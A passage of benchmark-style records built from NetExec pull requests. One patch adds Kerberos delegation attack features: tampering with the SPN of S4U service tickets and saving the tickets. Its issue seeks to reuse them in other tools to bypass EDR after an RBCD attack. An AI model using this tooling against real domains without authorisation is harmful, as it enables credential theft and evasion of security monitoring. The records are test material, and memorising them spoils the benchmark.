least the salt for the new encryption scheme is missing and that results in an error. Will fix it later the day!\nHey i pushed code that should fix the issue to the `neff-fix-veeam` branch. Could you install Netexec with `pipx install git+https://github.com/Pennyw0rth/NetExec@neff-fix-veeam --force` and check if issue is resolved?\nYes, it worked! Thank you!\nNice!\n\n", "commit_urls": ["https://github.com/Pennyw0rth/NetExec/commit/44624b703c7758d1e76d784bc083d61be2ab20c9"], "created_at": "2025-07-17T15:48:42Z"}
{"repo": "Pennyw0rth/NetExec", "pull_number": 825, "instance_id": "Pennyw0rth__NetExec-825", "issue_numbers": [809], "base_commit": "0fcba561d7a988556d7a42226ee14f3c7995a501", "patch": "diff --git a/nxc/protocols/smb.py b/nxc/protocols/smb.py\nindex 4d7f17bdea..0b4599925e 100755\n--- a/nxc/protocols/smb.py\n+++ b/nxc/protocols/smb.py\n@@ -44,7 +44,7 @@\n from nxc.logger import NXCAdapter\n from nxc.protocols.smb.dpapi import collect_masterkeys_from_target, get_domain_backup_key, upgrade_to_dploot_connection\n from nxc.protocols.smb.firefox import FirefoxCookie, FirefoxData, FirefoxTriage\n-from nxc.protocols.smb.kerberos import kerberos_login_with_S4U\n+from nxc.protocols.smb.kerberos import kerberos_login_with_S4U, kerberos_altservice, get_realm_from_ticket\n from nxc.protocols.smb.wmiexec import WMIEXEC\n from nxc.protocols.smb.atexec import TSCH_EXEC\n from nxc.protocols.smb.smbexec import SMBEXEC\n@@ -362,9 +362,17 @@ def kerberos_login(self, domain, username, password=\"\", ntlm_hash=\"\", aesKey=\"\",\n             if self.args.delegate:\n                 kerb_pass = \"\"\n                 self.username = self.args.delegate\n-                serverName = Principal(f\"cifs/{self.hostname}\", type=constants.PrincipalNameType.NT_SRV_INST.value)\n-                tgs = kerberos_login_with_S4U(domain, self.hostname, username, password, nthash, lmhash, aesKey, kdcHost, self.args.delegate, serverName, useCache, no_s4u2proxy=self.args.no_s4u2proxy)\n-                self.logger.debug(f\"Got TGS for {self.args.delegate} through S4U\")\n+                serverName = Principal(self.args.delegate_spn if self.args.delegate_spn else f\"cifs/{self.remoteName}\", type=constants.PrincipalNameType.NT_SRV_INST.value)\n+                tgs, sk = kerberos_login_with_S4U(domain, self.hostname, username, password, nthash, lmhash, aesKey, kdcHost, self.args.delegate, serverName, useCache, no_s4u2proxy=self.args.no_s4u2proxy)\n+                self.logger.debug(f\"TGS obtained for {self.args.delegate} for {serverName}\")\n+\n+                spn = f\"cifs/{self.remoteName}\"\n+                if self.args.delegate_spn:\n+                    self.logger.debug(f\"Swapping SPN to {spn} for TGS\")\n+                    tgs = kerberos_altservice(tgs, spn)\n+\n+                if self.args.generate_st:\n+                    self.save_st(tgs, sk, spn if self.args.delegate_spn else None)\n \n             self.conn.kerberosLogin(self.username, password, domain, lmhash, nthash, aesKey, kdcHost, useCache=useCache, TGS=tgs)\n             if \"Unix\" not in self.server_os:\n@@ -379,6 +387,9 @@ def kerberos_login(self, domain, username, password=\"\", ntlm_hash=\"\", aesKey=\"\",\n             if self.args.delegate:\n                 used_ccache = f\" through S4U with {username}\"\n \n+            if self.args.delegate_spn:\n+                used_ccache = f\" through S4U with {username} (w/ SPN {self.args.delegate_spn})\"\n+\n             out = f\"{self.domain}\\\\{self.username}{used_ccache} {self.mark_pwned()}\"\n             self.logger.success(out)\n \n@@ -645,6 +656,28 @@ def gen_relay_list(self):\n                 if self.host not in relay_list.read():\n                     relay_list.write(self.host + \"\\n\")\n \n+    def save_st(self, st, sk, new_spn=None):\n+        ccache = CCache()\n+        tgs_rep = st[\"KDC_REP\"]\n+        session_key = sk\n+\n+        try:\n+            ccache.fromTGS(tgs_rep, session_key, session_key)\n+        except SessionKeyDecryptionError as e:\n+            self.logger.fail(f\"Failed to decrypt session key: {e}\")\n+            return\n+\n+        if new_spn:\n+            # there is a new principal, likely from tampering the SPN during S4U2proxy\n+            realm = get_realm_from_ticket(st)\n+            principal = Principal(f\"{new_spn}@{realm}\", type=constants.PrincipalNameType.NT_SRV_INST.value)\n+            self.logger.debug(f\"Using principal {principal} for ST\")\n+            ccache.credentials[0][\"server\"].fromPrincipal(principal)\n+\n+        st_file = f\"{self.args.generate_st.removesuffix('.ccache')}.ccache\"\n+        ccache.saveFile(st_file)\n+        self.logger.success(f\"Saved ST to {st_file}\")\n+\n     def generate_tgt(self):\n         self.logger.info(f\"Attempting to get TGT for {self.username}@{self.domain}\")\n         userName = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n@@ -665,7 +698,7 @@ def generate_tgt(self):\n \n             ccache = CCache()\n             ccache.fromTGT(tgt, oldSessionKey, sessionKey)\n-            tgt_file = f\"{self.args.generate_tgt}.ccache\"\n+            tgt_file = f\"{self.args.generate_tgt.removesuffix('.ccache')}.ccache\"\n             ccache.saveFile(tgt_file)\n \n             self.logger.success(f\"TGT saved to: {tgt_file}\")\n@@ -2045,7 +2078,7 @@ def dpapi(self):\n             domain=self.domain,\n             username=self.username,\n             password=self.password,\n-            target=f\"{self.hostname}.{self.domain}\" if self.kerberos else self.host,\n+            target=self.remoteName,\n             lmhash=self.lmhash,\n             nthash=self.nthash,\n             do_kerberos=self.kerberos,\ndiff --git a/nxc/protocols/smb/kerberos.py b/nxc/protocols/smb/kerberos.py\nindex 87c64b0da6..82d27dacea 100644\n--- a/nxc/protocols/smb/kerberos.py\n+++ b/nxc/protocols/smb/kerberos.py\n@@ -275,4 +275,30 @@ def kerberos_login_with_S4U(domain, hostname, username, password, nthash, lmhash\n     tgs_formated[\"KDC_REP\"] = r\n     tgs_formated[\"cipher\"] = cipher\n     tgs_formated[\"sessionKey\"] = new_session_key\n-    return tgs_formated\n+    return tgs_formated, session_key\n+\n+\n+def get_realm_from_ticket(ticket):\n+    tgs_rep = ticket[\"KDC_REP\"]\n+    decoded_tgsrep = decoder.decode(tgs_rep, asn1Spec=TGS_REP())[0]\n+    return decoded_tgsrep[\"ticket\"][\"realm\"]\n+\n+\n+def kerberos_altservice(tgs, new_spn):\n+    service, host = new_spn.split(\"/\", 1)\n+    tgs_rep = tgs[\"KDC_REP\"]\n+\n+    decoded_tgsrep = decoder.decode(tgs_rep, asn1Spec=TGS_REP())[0]\n+\n+    # altservice\n+    decoded_tgsrep[\"ticket\"][\"sname\"][\"name-string\"].clear()\n+    decoded_tgsrep[\"ticket\"][\"sname\"][\"name-string\"].append(service)\n+    decoded_tgsrep[\"ticket\"][\"sname\"][\"name-string\"].append(host)\n+\n+    new_tgs_rep = encoder.encode(decoded_tgsrep)\n+\n+    new_tgs = {}\n+    new_tgs[\"KDC_REP\"] = new_tgs_rep\n+    new_tgs[\"cipher\"] = tgs[\"cipher\"]\n+    new_tgs[\"sessionKey\"] = tgs[\"sessionKey\"]\n+    return new_tgs\ndiff --git a/nxc/protocols/smb/proto_args.py b/nxc/protocols/smb/proto_args.py\nindex d5c3cec3ac..17110609bb 100644\n--- a/nxc/protocols/smb/proto_args.py\n+++ b/nxc/protocols/smb/proto_args.py\n@@ -1,4 +1,4 @@\n-from argparse import _StoreTrueAction\n+from argparse import _StoreTrueAction, _StoreAction\n from nxc.helpers.args import DisplayDefaultsNotNone, DefaultTrackingAction, get_conditional_action\n \n \n@@ -7,6 +7,8 @@ def proto_args(parser, parents):\n     smb_parser.add_argument(\"-H\", \"--hash\", metavar=\"HASH\", dest=\"hash\", nargs=\"+\", default=[], help=\"NTLM hash(es) or file(s) containing NTLM hashes\")\n \n     delegate_arg = smb_parser.add_argument(\"--delegate\", action=\"store\", help=\"Impersonate user with S4U2Self + S4U2Proxy\")\n+    delegate_spn_arg = smb_parser.add_argument(\"--delegate-spn\", action=get_conditional_action(_StoreAction), make_required=[], help=\"SPN to use for S4U2Proxy, if not specified the SPN used will be cifs/<target>\", type=str)\n+    generate_st = smb_parser.add_argument(\"--generate-st\", type=str, dest=\"generate_st\", action=get_conditional_action(_StoreAction), make_required=[], help=\"Store the S4U Service Ticket in the specified file\")\n     self_delegate_arg = smb_parser.add_argument(\"--self\", dest=\"no_s4u2proxy\", action=get_conditional_action(_StoreTrueAction), make_required=[], help=\"Only do S4U2Self, no S4U2Proxy (use with delegate)\")\n \n     dgroup = smb_parser.add_mutually_exclusive_group()\n@@ -24,6 +26,8 @@ def proto_args(parser, parents):\n     smb_parser.add_argument(\"--generate-krb5-file\", type=str, help=\"Generate a krb5 file like from a range of IP\")\n     smb_parser.add_argument(\"--generate-tgt\", type=str, help=\"Generate a tgt ticket\")\n     self_delegate_arg.make_required = [delegate_arg]\n+    generate_st.make_required = [delegate_arg]\n+    delegate_spn_arg.make_required = [delegate_arg]\n \n     cred_gathering_group = smb_parser.add_argument_group(\"Credential Gathering\", \"Options for gathering credentials\")\n     cred_gathering_group.add_argument(\"--sam\", choices={\"regdump\", \"secdump\"}, nargs=\"?\", const=\"regdump\", help=\"dump SAM hashes from target systems\")\n", "test_patch": "", "problem_statement": "Option to save the kerberos tickets when doing RBCD\nAn option to save the kerberos tickets that are created during a successful RBCD attack would be great.\n\nBeen running into weird issues with Impacket on a client, and getting a weird DRSUAPI error (even though the host is not a DC when i try to dump it with secretsdump). Used nxc for RBCD and it worked just fine, but --sam and --lsa are blocked by SentinelOne. So having the ability to save the kerberos tickets would be awesome so we can use it in other tools to try and bypass the EDR blocks.\n\n", "hints_text": "Thanks for the proposal! Maybe we could use the `--generate-tgt` arg to dump TGTs/STs in these cases\n\n", "all_hints_text": "Thanks for the proposal! Maybe we could use the `--generate-tgt` arg to dump TGTs/STs in these cases\n\n", "commit_urls": ["https://github.com/Pennyw0rth/NetExec/commit/8ce7e2fe2a5e8bdec50134cb344fca0cf8ed4cd2", "https://github.com/Pennyw0rth/NetExec/commit/96e4a306b75496ec81e9333f79205f09328113c2", "https://github.com/Pennyw0rth/NetExec/commit/57a06d0612032ec89cb0b435e5aa45b235718dd6", "https://github.com/Pennyw0rth/NetExec/commit/f2361e27d60555eef1a9dfa7470d2c00d623f872", "https://github.com/Pennyw0rth/NetExec/commit/718cbdb27c7bb8d2ae416aaef5b9d668c7a8fc7f", "https://github.com/Pennyw0rth/NetExec/commit/a829e958e63f95d690a31d3172a19c277aff3e7b", "https://github.com/Pennyw0rth/NetExec/commit/9f4246cf2d434490906d306e522514b4b1033ac1", "https://github.com/Pennyw0rth/NetExec/commit/6f928782dcde246515ba5d43ef38080234ed7a55", "https://github.com/Pennyw0rth/NetExec/commit/5161cbab035198583768c96e71a7968c524cd861", "https://github.com/Pennyw0rth/NetExec/commit/4fd412b9df08850fbcf653f74b94db367da03fa9"], "created_at": "2025-07-25T09:42:24Z"}
{"repo": "Pennyw0rth/NetExec", "pull_number": 995, "instance_id": "Pennyw0rth__NetExec-995", "issue_numbers": [869, 871, 878, 889], "base_commit": "fe8d9bc27c3cb51349cc69b1ff75210f766ab78d", "patch": "diff --git a/nxc/connection.py b/nxc/connection.py\nindex 729ff4e682..6d24182033 100755\n--- a/nxc/connection.py\n+++ b/nxc/connection.py\n@@ -175,6 +175,8 @@ def __init__(self, args, db, target):\n \n         try:\n             self.proto_flow()\n+        except FileNotFoundError as e:\n+            self.logger.error(f\"File not found error on target {target}: {e}\")\n         except Exception as e:\n             if \"ERROR_DEPENDENT_SERVICES_RUNNING\" in str(e):\n                 self.logger.error(f\"Exception while calling proto_flow() on target {target}: {e}\")\ndiff --git a/nxc/logger.py b/nxc/logger.py\nindex 82a4d5ee89..6a6d4a4ead 100755\n--- a/nxc/logger.py\n+++ b/nxc/logger.py\n@@ -179,7 +179,11 @@ def add_file_log(self, log_file=None):\n         file_creation = False\n \n         if not os.path.isfile(output_file):\n-            open(output_file, \"x\")  # noqa: SIM115\n+            try:\n+                open(output_file, \"x\")  # noqa: SIM115\n+            except FileNotFoundError:\n+                print(f\"{colored('[-]', 'red', attrs=['bold'])} Log file path does not exist: {os.path.dirname(output_file)}\")\n+                exit(1)\n             file_creation = True\n \n         file_handler = RotatingFileHandler(output_file, maxBytes=100000, encoding=\"utf-8\")\ndiff --git a/nxc/modules/nopac.py b/nxc/modules/nopac.py\nindex 4cc0e18424..aec8046e09 100644\n--- a/nxc/modules/nopac.py\n+++ b/nxc/modules/nopac.py\n@@ -19,6 +19,10 @@ def options(self, context, module_options):\n         \"\"\"No options available\"\"\"\n \n     def on_login(self, context, connection):\n+        if not connection.username:\n+            context.log.fail(\"Module requires a username to request TGTs\")\n+            return\n+\n         user_name = Principal(connection.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)\n         try:\n             tgt_with_pac, cipher, old_session_key, session_key = getKerberosTGT(\ndiff --git a/nxc/protocols/smb/samrfunc.py b/nxc/protocols/smb/samrfunc.py\nindex cd28ce9821..5a4cc0f1e0 100644\n--- a/nxc/protocols/smb/samrfunc.py\n+++ b/nxc/protocols/smb/samrfunc.py\n@@ -13,13 +13,14 @@ class SamrFunc:\n     def __init__(self, connection):\n         self.logger = connection.logger\n         self.addr = connection.host\n+        self.remote_name = connection.remoteName\n         self.protocol = connection.args.port\n         self.username = connection.username\n         self.password = connection.password\n         self.domain = connection.domain\n         self.hash = connection.hash\n-        self.lmhash = \"\"\n-        self.nthash = \"\"\n+        self.lmhash = connection.lmhash\n+        self.nthash = connection.nthash\n         self.aesKey = connection.aesKey\n         self.doKerberos = connection.kerberos\n         self.kdcHost = connection.kdcHost\n@@ -34,8 +35,8 @@ def __init__(self, connection):\n         if self.password is None:\n             self.password = \"\"\n \n-        self.samr_query = SAMRQuery(username=self.username, password=self.password, domain=self.domain, remote_name=self.addr, remote_host=self.host, kerberos=self.doKerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, logger=self.logger)\n-        self.lsa_query = LSAQuery(username=self.username, password=self.password, domain=self.domain, remote_name=self.addr, remote_host=self.host, kdcHost=self.kdcHost, kerberos=self.doKerberos, aesKey=self.aesKey, logger=self.logger)\n+        self.samr_query = SAMRQuery(username=self.username, password=self.password, domain=self.domain, remote_name=self.remote_name, remote_host=self.host, lmhash=self.lmhash, nthash=self.nthash, kerberos=self.doKerberos, kdcHost=self.kdcHost, aesKey=self.aesKey, logger=self.logger)\n+        self.lsa_query = LSAQuery(username=self.username, password=self.password, domain=self.domain, remote_name=self.remote_name, remote_host=self.host, lmhash=self.lmhash, nthash=self.nthash, kdcHost=self.kdcHost, kerberos=self.doKerberos, aesKey=self.aesKey, logger=self.logger)\n \n     def get_builtin_groups(self, group):\n         domains = self.samr_query.get_domains()\n@@ -84,12 +85,12 @@ def get_local_users(self, group, domain_handle):\n \n \n class SAMRQuery:\n-    def __init__(self, username=\"\", password=\"\", domain=\"\", port=445, remote_name=\"\", remote_host=\"\", kerberos=None, kdcHost=\"\", aesKey=\"\", logger=None,):\n+    def __init__(self, username=\"\", password=\"\", domain=\"\", port=445, remote_name=\"\", remote_host=\"\", lmhash=\"\", nthash=\"\", kerberos=None, kdcHost=\"\", aesKey=\"\", logger=None):\n         self.__username = username\n         self.__password = password\n         self.__domain = domain\n-        self.__lmhash = \"\"\n-        self.__nthash = \"\"\n+        self.__lmhash = lmhash\n+        self.__nthash = nthash\n         self.__aesKey = aesKey\n         self.__port = port\n         self.__remote_name = remote_name\n@@ -177,12 +178,12 @@ def get_alias_members(self, domain_handle, alias_id):\n \n \n class LSAQuery:\n-    def __init__(self, username=\"\", password=\"\", domain=\"\", port=445, remote_name=\"\", remote_host=\"\", kdcHost=\"\", aesKey=\"\", kerberos=None, logger=None):\n+    def __init__(self, username=\"\", password=\"\", domain=\"\", port=445, remote_name=\"\", remote_host=\"\", lmhash=\"\", nthash=\"\", kdcHost=\"\", aesKey=\"\", kerberos=None, logger=None):\n         self.__username = username\n         self.__password = password\n         self.__domain = domain\n-        self.__lmhash = \"\"\n-        self.__nthash = \"\"\n+        self.__lmhash = lmhash\n+        self.__nthash = nthash\n         self.__aesKey = aesKey\n         self.__port = port\n         self.__remote_name = remote_name\n", "test_patch": "", "problem_statement": "FileNotFoundError stacktrace if ccache file doesn't exist when using --use-kcache\n**Describe the bug**\nFileNotFoundError stacktrace if ccache file doesn't exist when using --use-kcache.\n\n**To Reproduce**\nSpecifying a ccache file that doesn't exist results in:\n\n```\nKRB5CCNAME='/tmp/ee.reed.ccache' nxc --dns-timeout 5 smb --smb-timeout 5 dc.rustykey.htb -u 'ee.reed' --use-kcache   \n[20:03:55] ERROR    Exception while calling proto_flow() on target dc.rustykey.htb: [Errno 2] No such file or directory: '/tmp/ee.reed.ccache'                                                                     connection.py:188\n                    \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Traceback (most recent call last) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e                  \n                    \u2502 /home/kali/.local/share/pipx/venvs/netexec/lib/python3.13/site-packages/nxc/connection.py:180 in __init__                                                                                  \u2502                  \n                    \u2502                                                                                                                                             